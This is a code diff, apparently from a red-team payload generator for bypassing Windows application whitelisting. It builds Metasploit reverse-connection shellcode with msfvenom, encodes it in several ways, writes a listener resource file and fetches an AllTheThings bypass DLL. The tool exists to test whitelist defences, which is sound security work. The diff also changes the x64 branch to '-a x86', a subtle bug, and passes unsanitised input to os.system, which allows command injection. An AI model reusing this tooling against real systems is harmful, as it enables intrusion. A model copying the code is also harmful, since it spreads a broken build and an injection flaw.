@@ -6,11 +6,35 @@ import base64
 import string
 import random
 
+"""
+This module is used for payload generation and operations.
+"""
 
 class Generator():
-
+    """
+    This class is used for payload generation and operations.
+    """
     def genShellcode(self, host, port, arch, name, payload, shellProcess=None):
-        # TODO fix to use string .format, remove the filewrite
+        """
+        Generates shellcode with msfvenom.
+
+        :param host: the ip address
+        :param port: the port
+        :param arch: the processor architecture
+        :param name: name of the payload
+        :param payload: type of metasploit payload
+        :param shellProcess: encoding process to apply to shellcode
+        :type host: string
+        :type port: string
+        :type arch: string
+        :type name: string
+        :type payload: string
+        :type shellProcess: string
+        :returns: shellcode
+        :rtype: string
+
+        .. todo: remove the file write
+        """
         code = ''
         form = 'c'
         uuid = name + str(self.id_generator())
@@ -25,13 +49,13 @@ class Generator():
             form = "psh"
 
         if (arch == "x86"):
-            os.system("msfvenom -a x86 --platform windows -p " + payload + " PayloadUUIDTracking=true PayloadUUIDName=" +
-                      uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
+             > /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form))
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         else:
-            os.system("msfvenom -a x64 --platform windows -p " + payload.replace('windows/', 'windows/x64/') + " PayloadUUIDTracking=true PayloadUUIDName=" +
-                      uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
+             > /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         with open("/tmp/metasploit", 'rb') as f:
@@ -51,6 +75,16 @@ class Generator():
         return shellcode
 
     def encodeShellcode(self, shellcode, shellProcess):
+        """
+        Encodes shellcode.
+
+        :param shellcode: the shellcode
+        :param shellProcess: the shellcode encoding process
+        :type shellcode: string
+        :type shellProcess: string
+        :returns: shellcode
+        :rtype: string
+        """
         if shellProcess == 'hexEncode':
             shellcode = self.hexEncode(shellcode)
         elif shellProcess == 'decEncode':
@@ -63,22 +97,45 @@ class Generator():
         return shellcode
 
     def hexEncode(self, shellcode):
-        # currently used to format mshta based payloads
+        """
+        Hex encodes shellcode.
+
+        :param shellcode: the shellcode
+        :type shellcode: string
+        :returns: shellcode
+        :rtype: string
+
+        .. note:: currently used to format mshta based payloads
+        """
         shellcode = "0x" + shellcode[30:-5]
         shellcode = shellcode.replace("\\\\", ",0")
         shellcode = shellcode.replace("\"\\n\"", "\n")
 
         return shellcode
 
-    def b64Encode(self, code):
-        # HTA-Shellcode
-        shellcode = str(base64.b64encode(code.encode('utf-8')))
+    def b64Encode(self, shellcode):
+        """
+        Base64 encodes the shellcode.
+
+        :param shellcode: the shellcode
+        :type shellcode: string
+        :returns: shellcode
+        :rtype: string
+        """
+        shellcode = str(base64.b64encode(shellcode.encode('utf-8')))
         shellcode = shellcode[2:-1]
 
         return shellcode
 
     def decEncode(self, shellcode):
-        # currently used for SCT based payloads
+        """
+        Decimal encode the shellcode. Currently used for SCT payloads.
+
+        :param shellcode: the shellcode
+        :type shellcode: string
+        :returns: shellcode
+        :rtype: string
+        """
         shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(shellcode), flags=re.MULTILINE)
         shellcode = ''.join(i[0].replace('', '') for i in shellcode)
 
@@ -101,6 +158,14 @@ class Generator():
         return(shellcode)
 
     def pshEncode(self, shellcode):
+        """
+        Powershell encode the shellcode. Credits to TrustedSec.
+
+        :param shellcode: the shellcode
+        :type shellcode: string
+        :returns: shellcode
+        :rtype: string
+        """
         shellcode = "for (;;){\n  Start-sleep 60\n}" + shellcode
         shellcode = base64.b64encode(shellcode.encode('utf-8'))
         shellcode = shellcode.decode('utf-8')
@@ -108,11 +173,23 @@ class Generator():
         return shellcode
 
     def genRunScript(self, run_info):
+        """
+        Dynamically generate batch script to execute all the payloads.
+
+        :param run_info: the info to execute a payload
+        :type run_info: string
+        """
         with open('./GenerateAll/gr8sct.bat', 'a+') as f:
             f.write(run_info + '\n')
             f.write('timeout 30 > NUL\n')
 
     def compileAllTheThings(self, name):
+        """
+        Compiles AllTheThings DLL 5 in 1 AWL on Linux.
+
+        :param name: name of the payload
+        :type name: string
+        """
         build_steps = [
             "apt-get install mono-complete -y >/dev/null 2>&1",
             "git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
@@ -130,7 +207,18 @@ class Generator():
             os.popen(step)
 
     def genMetasploitReourceFile(self, host, port, payload):
-        # TODO: make dynamic for arch
+        """
+        Dynamically generates a Metasploit resource file.
+
+        :param host: the ip address
+        :param port: the port
+        :param payload: type of metasploit payload
+        :type host: string
+        :type port: string
+        :type payload: string
+
+        .. todo:: make dynamic for architecture
+        """
         msfrc = '''use exploit/multi/handler
 set TimestampOutput true
 set VERBOSE true
@@ -146,29 +234,59 @@ run -j'''.format(host, port, payload)
             f.write(msfrc)
 
     def genUUIDTrackingResouceFile(self):
+        """
+        Generates a Metasploit resource file to track UUIDs.
+
+        This resource script automatically updates the analyst.csv file.
+        It works by checking if the UUID has changed into Metasploit and then
+        searches for the entry in anaylst.csv and marks the column TRUE.
+        """
         msfrc = '''<ruby>
 if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
-	f = open("./GenerateAll/analyst.csv", "r+")
-	f.each_line do |line|
-		if line.include? uuid_info["PayloadUUIDName"].to_s
-			f.puts line.gsub("FALSE", "TRUE")
-		end
-	end
-	f.close
+    f = open("./GenerateAll/analyst.csv", "r+")
+    f.each_line do |line|
+        if line.include? uuid_info["PayloadUUIDName"].to_s
+            f.puts line.gsub("FALSE", "TRUE")
+        end
+    end
+    f.close
 end
 </ruby>'''
         with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
             f.write(msfrc)
 
     def createAnalystCSVFile(self):
+        """
+        Creates the anaylst CSV file.
+
+        The anaylst CSV file is for SOC/IR anaylsts to test
+        as well as track the efficacy of their application whitelist policy.
+        """
         with open("./GenerateAll/analyst.csv", 'w+') as f:
             f.write('bypass,uuid,sucessful\n')
 
     def genAnalystCSVFile(self, bypass, uuid):
+        """
+        Generates the anaylst CSV file with GenerateAll payloads.
+
+        The anaylst CSV file is for SOC/IR anaylsts to test
+        as well as track the efficacy of their application whitelist policy.
+        """
         with open("./GenerateAll/analyst.csv", 'a') as f:
             f.write(bypass + ',' + uuid + ',' + 'FALSE' + '\n')
 
     def id_generator(self, size=6, chars=string.ascii_uppercase):
+        """
+        Psuedo-random UUID generator.
+
+        :param size: the character length of the uuid
+        :param chars: characters to use in generation
+        :type size: int
+        :type chars: list
+        :returns: uuid
+        :rtype: string
+
+        """
         uuid = ''.join(random.choice(chars) for _ in range(size))
 
         return uuid
